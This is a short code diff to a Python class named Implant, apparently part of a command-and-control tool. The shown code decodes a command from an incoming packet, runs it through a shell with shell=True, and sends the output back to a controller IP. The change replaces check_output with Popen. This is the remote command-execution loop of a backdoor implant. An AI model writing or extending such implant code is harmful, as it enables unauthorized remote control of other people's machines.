@@ -22,7 +22,8 @@ class Implant(Host):
             cmd = shellpack['data'].decode()
             # cmds = cmd.split("|")
             #cmd = cmd.split(" ")
-            output = check_output(cmd, stderr=STDOUT, timeout=3, shell=True)
+            ps = Popen(cmd,shell=True,stdout=PIPE,stderr=STDOUT)
+            output = ps.communicate()[0]
             
             self.send(self.controller_ip, "instruction", output)
         except TimeoutExpired:
